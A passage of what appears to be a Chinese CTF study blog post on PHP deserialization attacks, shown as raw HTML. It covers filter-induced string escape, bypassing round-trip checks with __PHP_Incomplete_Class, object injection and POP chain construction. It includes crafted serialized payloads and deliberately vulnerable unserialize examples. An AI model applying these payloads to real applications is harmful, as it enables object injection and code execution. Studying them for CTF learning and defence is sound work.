class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;change&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;xx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;x&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;age&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;age&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;反序列化字符串：&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;过滤后:&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$old&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;change&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$arr&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$old&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$new&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$old&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$new&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;此时，age=&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$new&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;age&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;正常情况传入 &lt;code&gt;name=mao&amp;amp;age=11&lt;/code&gt;  的结果&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造一下&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；&lt;br&gt;
我们来看，这部分是 age 序列化后的结果&lt;/p&gt;
&lt;p&gt;s:3:“age”;s:28:“11”;s:3:“age”;s:6:“woaini”;}&amp;quot;&lt;/p&gt;
&lt;p&gt;由于前面是 40 个 x 所以导致少了 20 个字符，所以需要后面来补上， &lt;code&gt;&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:28:&amp;quot;&lt;/code&gt; 11 这一部分刚好 20 个，后面由于有&amp;quot; 闭合了前面因此后面的参数就可以由我们自定义执行了&lt;/p&gt;
&lt;h4 id=&#34;利用不完整类绕过序列化回旋镖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用不完整类绕过序列化回旋镖&#34;&gt;#&lt;/a&gt; 利用不完整类绕过序列化回旋镖&lt;/h4&gt;
&lt;p&gt;当存在  &lt;code&gt;serialize(unserialize($x)) != $x&lt;/code&gt;  这种很神奇的东西时，我们可以利用不完整类  &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  来进行处理&lt;/p&gt;
&lt;p&gt;当我们尝试反序列化到一个不存在的类是，PHP 会使用  &lt;code&gt;__PHP_Incomplete_Class_Name&lt;/code&gt;  这个追加的字段来进行存储&lt;/p&gt;
&lt;p&gt;我们于是可以尝试自己构造一个不完整类&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$raw&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;O:1:&amp;quot;A&amp;quot;:2:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:1:&amp;quot;b&amp;quot;;s:27:&amp;quot;__PHP_Incomplete_Class_Name&amp;quot;;s:1:&amp;quot;F&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$exp&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;O:1:&amp;quot;F&amp;quot;:1:&amp;#123;s:1:&amp;quot;a&amp;quot;;s:1:&amp;quot;b&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$raw&lt;/span&gt;)) == &lt;span class=&#34;variable&#34;&gt;$exp&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样就可以绕过了&lt;/p&gt;
&lt;p&gt;更近一步，我们可以通过这个让一个对象被调用后凭空消失，只需要手动构造无 &lt;code&gt;__PHP_Incomplete_Class_Name&lt;/code&gt;  的不完整对象&lt;/p&gt;
&lt;h5 id=&#34;serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作&#34;&gt;#&lt;/a&gt; serialize () 函数在处理 &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  对象时所进行的特殊操作&lt;/h5&gt;
&lt;p&gt;unserialize () 在发现当前 PHP 上下文中没有包含相关类的类定义时将创建一个  &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  对象。而 serialize () 在发现需要进行序列化的对象是  &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  后，将对其进行 特殊处理 以得到描述实际对象而非  &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  对象的序列化文本，而这里就包含了 将属性的描述值减一 这一步。&lt;br&gt;
那么对象所属类的名称是否会发生替换，序列化文本中的  &lt;code&gt;__PHP_Incomplete_Class_Name&lt;/code&gt;  是否会被自动删除以使得序列化文本中的属性个数描述值与实际相符呢？对此，请参考如下示例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;O:22:&amp;quot;__PHP_Incomplete_Class&amp;quot;:3:&amp;#123;s:27:&amp;quot;__PHP_Incomplete_Class_Name&amp;quot;;s:7:&amp;quot;MyClass&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:8:&amp;quot;RedHeart&amp;quot;;s:6:&amp;quot;nation&amp;quot;;s:5:&amp;quot;China&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;执行结果&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;69&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;O:7:&amp;quot;&lt;/span&gt;MyClass&lt;span class=&#34;string&#34;&gt;&amp;quot;:2:&amp;#123;s:4:&amp;quot;&lt;/span&gt;name&lt;span class=&#34;string&#34;&gt;&amp;quot;;s:8:&amp;quot;&lt;/span&gt;RedHeart&lt;span class=&#34;string&#34;&gt;&amp;quot;;s:6:&amp;quot;&lt;/span&gt;nation&lt;span class=&#34;string&#34;&gt;&amp;quot;;s:5:&amp;quot;&lt;/span&gt;China&lt;span class=&#34;string&#34;&gt;&amp;quot;;&amp;#125;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;结合前面观察到的种种现象，我们可以总结出 serialize () 函数对 __PHP_Incomplete_Class 对象执行了如下 特殊操作（操作描述顺序并非 serialize 函数的实际操作顺序）：&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt; __PHP_Incomplete_Class&lt;/code&gt;  对象中的 属性个数减一 并将其作为序列化文本中 对实际对象属性个数的描述值。&lt;br&gt;
将  &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  对象的 &lt;code&gt; __PHP_Incomplete_Class_Name&lt;/code&gt;  作为序列化文本中 对象所属类的描述值。若未从  &lt;code&gt;__PHP_Incomplete_Class &lt;/code&gt; 对象 中检查到  &lt;code&gt;__PHP_Incomplete_Class_Name&lt;/code&gt;  属性，则跳过此步。&lt;br&gt;
将  &lt;code&gt;__PHP_Incomplete_Class &lt;/code&gt; 对象的序列化文本中对  &lt;code&gt;__PHP_Incomplete_Class_Name &lt;/code&gt; 属性的描述删去。若没有发现相关描述，则跳过此步。&lt;/p&gt;
&lt;p&gt;关于 &lt;code&gt;__PHP_Incomplete_Class&lt;/code&gt;  更详细的介绍 &amp;lt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_44879989/article/details/133486308&#34;&gt;PHP 反序列化漏洞：__PHP_Incomplete_Class 与 serialize (unserialize ($x)) !== $x &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&amp;gt;&lt;/p&gt;
&lt;h4 id=&#34;对象注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对象注入&#34;&gt;#&lt;/a&gt; 对象注入&lt;/h4&gt;
&lt;p&gt;当用户的请求在传给反序列化函数 &lt;code&gt;unserialize()&lt;/code&gt;  之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 &lt;code&gt;unserialize&lt;/code&gt;  函数，最终导致一个在该应用范围内的任意 PHP 对象注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对象漏洞&lt;/strong&gt;出现得满足两个前提&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、 &lt;code&gt;unserialize&lt;/code&gt;  的参数可控。&lt;br&gt;
2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;A&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$test&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;y4mao&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;test;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;O:1:&amp;quot;A&amp;quot;:1:&amp;#123;s:4:&amp;quot;test&amp;quot;;s:5:&amp;quot;maomi&amp;quot;;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在脚本运行结束后便会调用 &lt;code&gt;_destruct&lt;/code&gt;  函数，同时会覆盖 test 变量输出 &lt;code&gt;maomi&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;pop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pop&#34;&gt;#&lt;/a&gt; POP&lt;/h3&gt;
&lt;h4 id=&#34;魔法函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#魔法函数&#34;&gt;#&lt;/a&gt; ———— 魔法函数 ———&lt;/h4&gt;
&lt;p&gt;我需要再次提出魔法函数并且需要细致的解释供我更加深刻的理解&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__wakeup() //执行unserialize()时，先会调用这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep() //执行serialize()时，先会调用这个函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct() //对象被销毁时触发（对象不再被引用（unset），脚本执行结束）（当存在__destruct时，头一般是他）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call() //在对象上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic() //在静态上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get() //用于从不可访问的属性读取数据（比如访问private属性或者不存在的属性的值时）或者不存在这个键（$this-&amp;gt;str[&amp;#x27;str&amp;#x27;]-&amp;gt;source）都会调用此方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set() //用于将数据写入不可访问的属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset() //在不可访问的属性上调用isset()或empty()触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset() //在不可访问的属性上使用unset()时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString() //把类当作字符串使用时触发（输出一个对象、属性，将对象或属性与字符串拼接，对对象或属性进行正则匹配）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke() //当尝试将对象（属性）调用为函数时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__debugInfo() //在使用 var_dump, print_r 时会被调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set_state()   // 调用var_export()导出类时，此静态方法会被调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__clone()       // 当对象复制完成时调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__autoload()    // 尝试加载未定义的类&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;会发现，我在很多魔法函数的触发方式的解释中对象后面都加了（属性），这与 php 官方手册和其他博客文章的解释有些许不同，在查找资料时产生了很多疑惑，比如我翻阅的其中一篇博客：&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png&#34; alt=&#34;5fd161f2f08ca123a0c6ccd8f4cc17cd.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;原文说此处触发了 &lt;code&gt;__toString&lt;/code&gt;  函数，可明明只是将属性当作字符串，&lt;/p&gt;
&lt;p&gt;再比如同一篇文章的另一处：&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png&#34; alt=&#34;28258fc1d508554e89f8f7d99d3855b1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;触发了 &lt;code&gt;__invoke&lt;/code&gt;  函数&lt;/p&gt;
&lt;p&gt;在与小伙伴讨论之后，认为可以将属性看作对象&lt;/p&gt;
&lt;p&gt;在弄清楚各种魔法函数触发条件之后就要开始构建 pop 链了&lt;/p&gt;
&lt;h4 id=&#34;pop链&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pop链&#34;&gt;#&lt;/a&gt; POP 链&lt;/h4&gt;
&lt;p&gt;POP 链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的 POP 链就显而易见了。CTF 赛中一般尾部就是 get flag 的方法，头部则是 GET/POST 传参&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span 